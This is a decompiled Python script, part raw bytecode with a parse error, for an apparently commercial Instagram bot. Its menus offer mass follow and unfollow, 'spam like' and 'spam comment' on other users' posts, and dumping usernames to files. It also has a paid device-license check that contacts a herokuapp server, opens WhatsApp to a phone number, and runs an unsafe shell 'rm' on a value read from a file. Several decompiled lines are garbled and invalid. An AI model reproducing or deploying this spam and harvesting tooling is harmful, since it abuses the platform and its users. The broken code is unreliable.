             1072  BINARY_SUBSCR    
             1074  LOAD_CONST               ('username', 'fullname')
             1076  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
             1078  CALL_METHOD_1         1  ''
             1080  POP_TOP          
         1082_1084  JUMP_BACK          1052  'to 1052'
           1086_0  COME_FROM          1052  '1052'

 L. 311      1086  LOAD_GLOBAL              open
             1088  LOAD_FAST                'saved'
             1090  LOAD_STR                 'a'
             1092  CALL_FUNCTION_2       2  ''
             1094  SETUP_WITH         1116  'to 1116'
             1096  STORE_FAST               'f'

 L. 312      1098  LOAD_FAST                'f'
             1100  LOAD_METHOD              write
             1102  LOAD_GLOBAL              str
             1104  LOAD_FAST                'id'
             1106  CALL_FUNCTION_1       1  ''
             1108  CALL_METHOD_1         1  ''
             1110  POP_TOP          
             1112  POP_BLOCK        
             1114  BEGIN_FINALLY    
           1116_0  COME_FROM_WITH     1094  '1094'
             1116  WITH_CLEANUP_START
             1118  WITH_CLEANUP_FINISH
             1120  END_FINALLY      

 L. 313      1122  LOAD_CONST               True
             1124  STORE_GLOBAL             CONDITION

 L. 314      1126  LOAD_GLOBAL              print
             1128  LOAD_STR                 ''
             1130  CALL_FUNCTION_1       1  ''
             1132  POP_TOP          

 L. 315      1134  LOAD_GLOBAL              str
             1136  LOAD_GLOBAL              len
             1138  LOAD_FAST                'id'
             1140  CALL_FUNCTION_1       1  ''
             1142  CALL_FUNCTION_1       1  ''
             1144  LOAD_FAST                'total'
             1146  COMPARE_OP               !=
         1148_1150  POP_JUMP_IF_FALSE  1176  'to 1176'

 L. 316      1152  LOAD_GLOBAL              show
             1154  LOAD_STR                 'Finished with '
             1156  LOAD_GLOBAL              str
             1158  LOAD_GLOBAL              len
             1160  LOAD_FAST                'id'
             1162  CALL_FUNCTION_1       1  ''
             1164  CALL_FUNCTION_1       1  ''
             1166  FORMAT_VALUE          0  ''
             1168  LOAD_STR                 ' usernames'
             1170  BUILD_STRING_3        3 
             1172  CALL_FUNCTION_1       1  ''
             1174  POP_TOP          
           1176_0  COME_FROM          1148  '1148'

 L. 317      1176  LOAD_GLOBAL              info
             1178  LOAD_STR                 'Done, file saved in '
             1180  LOAD_FAST                'saved'
             1182  FORMAT_VALUE          0  ''
             1184  BUILD_STRING_2        2 
             1186  LOAD_GLOBAL              crack
             1188  CALL_FUNCTION_2       2  ''
             1190  POP_TOP          
         1192_1194  JUMP_FORWARD       1488  'to 1488'
           1196_0  COME_FROM           796  '796'

 L. 318      1196  LOAD_FAST                'choice'
             1198  LOAD_STR                 '4'
             1200  COMPARE_OP               ==
         1202_1204  POP_JUMP_IF_FALSE  1472  'to 1472'

 L. 319      1206  LOAD_GLOBAL              __import__
             1208  LOAD_STR                 'instagram'
             1210  CALL_FUNCTION_1       1  ''
             1212  LOAD_ATTR                finallog
             1214  STORE_FAST               'Ses'

 L. 320      1216  SETUP_FINALLY      1438  'to 1438'

 L. 321      1218  LOAD_GLOBAL              os
             1220  LOAD_METHOD              listdir
             1222  LOAD_STR                 './dump'
             1224  CALL_METHOD_1         1  ''
             1226  STORE_FAST               'listfile'

 L. 322      1228  LOAD_GLOBAL              enumerate
             1230  LOAD_FAST                'listfile'
             1232  LOAD_CONST               1
             1234  CALL_FUNCTION_2       2  ''
             1236  GET_ITER         
           1238_0  COME_FROM          1338  '1338'
           1238_1  COME_FROM          1334  '1334'
           1238_2  COME_FROM          1328  '1328'
           1238_3  COME_FROM          1308  '1308'
             1238  FOR_ITER           1342  'to 1342'
             1240  UNPACK_SEQUENCE_2     2 
             1242  STORE_FAST               'count'
             1244  STORE_FAST               'files'

 L. 323      1246  SETUP_FINALLY      1310  'to 1310'

 L. 324      1248  LOAD_GLOBAL              print

 L. 325      1250  LOAD_STR                 '   '
             1252  LOAD_GLOBAL              str
             1254  LOAD_FAST                'count'
             1256  CALL_FUNCTION_1       1  ''
             1258  FORMAT_VALUE          0  ''
             1260  LOAD_STR                 '). '
             1262  LOAD_GLOBAL              str
             1264  LOAD_FAST                'files'
             1266  CALL_FUNCTION_1       1  ''
             1268  FORMAT_VALUE          0  ''
             1270  LOAD_STR                 ' '
             1272  LOAD_GLOBAL              str
             1274  LOAD_GLOBAL              len
             1276  LOAD_GLOBAL              eval
             1278  LOAD_GLOBAL              open
             1280  LOAD_STR                 './dump/'
             1282  LOAD_FAST                'files'
             1284  BINARY_ADD       
             1286  CALL_FUNCTION_1       1  ''
             1288  LOAD_METHOD              readline
             1290  CALL_METHOD_0         0  ''
             1292  CALL_FUNCTION_1       1  ''
             1294  CALL_FUNCTION_1       1  ''
             1296  CALL_FUNCTION_1       1  ''
             1298  FORMAT_VALUE          0  ''
             1300  BUILD_STRING_6        6 

 L. 324      1302  CALL_FUNCTION_1       1  ''
             1304  POP_TOP          
             1306  POP_BLOCK        
             1308  JUMP_BACK          1238  'to 1238'
           1310_0  COME_FROM_FINALLY  1246  '1246'

 L. 327      1310  DUP_TOP          
             1312  LOAD_GLOBAL              Exception
             1314  COMPARE_OP               exception-match
         1316_1318  POP_JUMP_IF_FALSE  1336  'to 1336'
             1320  POP_TOP          
             1322  POP_TOP          
             1324  POP_TOP          

 L. 328      1326  POP_EXCEPT       
         1328_1330  JUMP_BACK          1238  'to 1238'
             1332  POP_EXCEPT       
             1334  JUMP_BACK          1238  'to 1238'
           1336_0  COME_FROM          1316  '1316'
             1336  END_FINALLY      
         1338_1340  JUMP_BACK          1238  'to 1238'
           1342_0  COME_FROM          1238  '1238'

 L. 329      1342  SETUP_FINALLY      1402  'to 1402'

 L. 330      1344  LOAD_GLOBAL              eval

 L. 331      1346  LOAD_GLOBAL              open

 L. 332      1348  LOAD_STR                 'dump/'
             1350  LOAD_FAST                'listfile'
             1352  LOAD_GLOBAL              int
             1354  LOAD_GLOBAL              select
             1356  LOAD_CONST               1
             1358  LOAD_GLOBAL              len
             1360  LOAD_FAST                'listfile'
             1362  CALL_FUNCTION_1       1  ''
             1364  CALL_FUNCTION_2       2  ''
             1366  CALL_FUNCTION_1       1  ''
             1368  LOAD_CONST               1
             1370  BINARY_SUBTRACT  
             1372  BINARY_SUBSCR    
             1374  BINARY_ADD       

 L. 331      1376  CALL_FUNCTION_1       1  ''
             1378  LOAD_METHOD              readline
             1380  CALL_METHOD_0         0  ''

 L. 330      1382  CALL_FUNCTION_1       1  ''
             1384  STORE_FAST               'users'

 L. 335      1386  LOAD_GLOBAL              instagram
             1388  LOAD_ATTR                finallog
             1390  LOAD_METHOD              sorting
             1392  LOAD_FAST                'users'
             1394  CALL_METHOD_1         1  ''
             1396  POP_TOP          
             1398  POP_BLOCK        
             1400  JUMP_FORWARD       1434  'to 1434'
           1402_0  COME_FROM_FINALLY  1342  '1342'

 L. 336      1402  DUP_TOP          
             1404  LOAD_GLOBAL              Exception
             1406  COMPARE_OP               exception-match
         1408_1410  POP_JUMP_IF_FALSE  1432  'to 1432'
             1412  POP_TOP          
             1414  POP_TOP          
             1416  POP_TOP          

 L. 337      1418  LOAD_GLOBAL              info
             1420  LOAD_STR                 'Something Wrong'
             1422  LOAD_GLOBAL              crack
             1424  CALL_FUNCTION_2       2  ''
             1426  POP_TOP          
             1428  POP_EXCEPT       
             1430  JUMP_FORWARD       1434  'to 1434'
           1432_0  COME_FROM          1408  '1408'
             1432  END_FINALLY      
           1434_0  COME_FROM          1430  '1430'
           1434_1  COME_FROM          1400  '1400'
             1434  POP_BLOCK        
             1436  JUMP_FORWARD       1470  'to 1470'
           1438_0  COME_FROM_FINALLY  1216  '1216'

 L. 338      1438  DUP_TOP          
             1440  LOAD_GLOBAL              EOFError
             1442  COMPARE_OP               exception-match
         1444_1446  POP_JUMP_IF_FALSE  1468  'to 1468'
             1448  POP_TOP          
             1450  POP_TOP          
             1452  POP_TOP          

 L. 339      1454  LOAD_GLOBAL              info
             1456  LOAD_STR                 'You not have a files username, Please dump'
             1458  LOAD_GLOBAL              crack
             1460  CALL_FUNCTION_2       2  ''
             1462  POP_TOP          
             1464  POP_EXCEPT       
             1466  JUMP_FORWARD       1470  'to 1470'
           1468_0  COME_FROM          1444  '1444'
             1468  END_FINALLY      
           1470_0  COME_FROM          1466  '1466'
           1470_1  COME_FROM          1436  '1436'
             1470  JUMP_FORWARD       1488  'to 1488'
           1472_0  COME_FROM          1202  '1202'

 L. 340      1472  LOAD_FAST                'choice'
             1474  LOAD_STR                 '5'
             1476  COMPARE_OP               ==
         1478_1480  POP_JUMP_IF_FALSE  1488  'to 1488'

 L. 341      1482  LOAD_GLOBAL              main
             1484  CALL_FUNCTION_0       0  ''
             1486  POP_TOP          
           1488_0  COME_FROM          1478  '1478'
           1488_1  COME_FROM          1470  '1470'
           1488_2  COME_FROM          1192  '1192'
           1488_3  COME_FROM          1020  '1020'
           1488_4  COME_FROM           786  '786'
           1488_5  COME_FROM           614  '614'
           1488_6  COME_FROM           380  '380'
           1488_7  COME_FROM           376  '376'
           1488_8  COME_FROM           340  '340'

Parse error at or near `END_FINALLY' instruction at offset 854


def account_info():
    global POSITION
    animation = Thread(target=animate)
    animation.daemon = True
    POSITION = account_info
    banner()
    brain(['Get your info', 'Get users info', 'Back'])
    choice = select(1, 3)
    if choice == '1':
        user = instagram.account.get_me(ses)
        for i in zip(user.keys(), user.values()):
            show(f"{i[0]} : {i[1]}")
        else:
            info('Done', account_info)

    elif choice == '2':
        username = input_('Username')
        user = instagram.account.get_user(ses, username)
        for i in zip(user.keys(), user.values()):
            show(f" {i[0]} : {i[1]}")
        else:
            info('Done', account_info)

    elif choice == '3':
        menu()


def mass_foll_account():
    global CONDITION
    global POSITION
    animation = Thread(target=animate)
    animation.daemon = True
    POSITION = mass_foll_account
    banner()
    brain(['Follow your followers', 'Followed by file list', 'Back'])
    choice = select(1, 3)
    if choice == '1':
        animation.start()
        for user in instagram.account.get_followers(ses, user_logged['id']):
            if user['is_followed']:
                continue
            else:
                instagram.action.follow(ses, user['id'])
        else:
            CONDITION = True
            print('')
            info('Done', mass_foll_account)

    elif choice == '2':
        listakun = input_('Filelist')
        try:
            files = open(listakun).readlines()
            animation.start()
            show(f"Total : {str(len(files))}")
            for i in files:
                instagram.action.follow(ses, i.strip())
            else:
                CONDITION = True
                print('')
                info('Done', mass_foll_account)

        except FileNotFoundError:
            info('List not found', mass_foll_account)

    elif choice == '3':
        menu()


def mass_unfoll_account():
    global CONDITION
    global POSITION
    animation = Thread(target=animate)
    animation.daemon = True
    POSITION = mass_unfoll_account
    banner()
    brain(['Unfollow all following', 'Unfollow from list', 'Back'])
    choice = select(1, 3)
    if choice == '1':
        for i in instagram.account.get_following(ses, user_logged['id']):
            instagram.action.unfollow(ses, i['id'])
        else:
            CONDITION = True
            print('')
            info('Done', mass_unfoll_account)

    elif choice == '2':
        listakun = input_('Filelist')
        try:
            files = open(listakun).readlines()
            animation.start()
            show(f"Total : {str(len(files))}")
            for i in files:
                instagram.action.unfollow(ses, i.strip())
            else:
                CONDITION = True
                print('')
                info('Done', mass_unfoll_account)

        except FileNotFoundError:
            info('List not found', mass_unfoll_account)

    elif choice == '3':
        menu()


def mass_like_post():
    global CONDITION
    global POSITION
    animation = Thread(target=animate)
    animation.daemon = True
    POSITION = mass_like_post
    banner()
    brain(['Spam like in home', 'Spam like in friend timeline', 'Back'])
    choice = select(1, 3)
    if choice == '1':
        total = username = int(input_('Amount (ex: 20)'))
        animation.start()
        for i in instagram.account.get_post_home(ses, total):
            show(i['username'])
            instagram.action.like(ses, i['id_post'])
        else:
            CONDITION = True
            print('')
            info('Done', mass_like_post)

    elif choice == '2':
        username = input_('Username')
        username = instagram.action.get_user(ses, username)
        if 'not found' not in str(username):
            animation.start()
            total = username = int(input_('Amount (ex: 20)'))
            for i in instagram.account.get_post_peoplesesusername['id']total:
                instagram.action.like(ses, i['id'])

        else:
            info('Username wrong', mass_like_post)
        CONDITION = True
        print('')
        info('Done', mass_like_post)
    elif choice == '3':
        menu()


def mass_unlike_post():
    global CONDITION
    global POSITION
    animation = Thread(target=animate)
    animation.daemon = True
    POSITION = mass_unlike_post
    banner()
    brain(['Mass unlike in friend timeline', 'Back'])
    choice = select(1, 2)
    if choice == '1':
        username = input_('Username')
        username = instagram.action.get_user(ses, username)
        if 'not found' not in str(username):
            animation.start()
            total = username = int(input_('Amount (ex: 20)'))
            for i in instagram.account.get_post_peoplesesusername['id']total:
                instagram.action.unlike(ses, i['id_post'])

        else:
            info('Username wrong', mass_like_post)
        CONDITION = True
        print('')
        info('Done', mass_unlike_post)
    elif choice == '2':
        menu()


def mass_comment():
    global CONDITION
    global POSITION
    POSITION = mass_comment
    animation = Thread(target=animate)
    animation.daemon = True
    banner()
    brain(['Spam comment in home', 'Spam comment in people timeline', 'Back'])
    choice = select(1, 3)
    if choice == '1':
        comment = input_('Text')
        total = username = int(input_('Amount (ex: 20)'))
        animation.start()
        for i in instagram.account.get_post_home(ses, total):
            if not i['comments_disabled']:
                instagram.action.commentsesi['id_post']comment
        else:
            CONDITION = True
            print('')
            info('Done', mass_comment)

    elif choice == '2':
        username = instagram.account.get_user(ses, input_('Username'))
        comment = input_('Text')
        total = int(input_('Amount'))
        animation.start()
        for i in instagram.account.get_post_peoplesesusername['id']total:
            if not i['comments_disabled']:
                instagram.action.commentsesi['id_post']comment
        else:
            CONDITION = True
            print('')
            info('Done', mass_comment)

    elif choice == '3':
        menu()


if __name__ == '__main__':
    import re, random, requests, subprocess

    def echo(command, arg, args):
        return subprocess.Popen([command, arg, args], stdout=(subprocess.PIPE)).stdout.read().decode().strip()


    banner()
    uid = str(os.geteuid())
    path = os.path.defpath + '/.zet'
    if not os.path.exists(path) or len(open(path).readlines()) == 0:
        print(" [WARN] Your device it's not registered yet.                    \n        Please register first!\n")
        print('   1). Trial one day')
        print('   2). Buy 30k 1 Month')
        print('   3). Buy 50k 2 Month')
        print('   4). Buy 100k 5 Month\n')
        choice = input('  [?] Select choice: ')
        if choice == '1':
            kode = [
             'TR', 'AL']
            masa = 'trial'
        elif choice == '2':
            kode = [
             'On', 'On']
            masa = 'dayss'
        elif choice == '3':
            kode = [
             'Mo', 'Tw']
            masa = 'month'
        elif choice == '4':
            kode = [
             'Ye', 'OY']
            masa = 'years'
        name = input('  [?] Your name: ')
        finalid = (kode[0] + random.choice(list('AbADHYnFSaeqW')) + kode[0] + uid + kode[1] + masa.upper())[::-1]
        with open(path, 'w') as f:
            f.write(finalid)
        text = 'Konfirmasi saya dengan id: ' + finalid
        requests.get('https://instatools-app.herokuapp.com/signin?raw=' + finalid).text
        print('  [!] Your ID : ' + finalid)
        getpass('  [!] Press enter to confirm your ID')
        echo('am', 'start', 'https://wa.me/6281242873775/?text=' + text)
        exit('  [!] Please wait for it to be confirmed')
    else:
        path = open(path).read().strip()
        uid = re.findall('\\d+', path)[0][::-1]
        user = requests.get(f"https://instatools-app.herokuapp.com/member/{uid}").json()
        if 'you have reached the last use' in str(user):
            os.system(f"rm {path}")
            print('  [!] Error: your ID has expired !')
            exit('  [!] Please buy the active period')
        elif 'active_period' in str(user):
            ses = Session(uid)
            main()
        else:
            text = 'Konfirmasi saya dengan id: ' + path
            print('  [!] Not confirmed yet')
            echo('am', 'start', 'https://wa.me/6281242873775/?text=' + text)
            exit('  [!] Please wait for it to be confirmed')
else:
    exit()
# global EXPASS ## Warning: Unused global
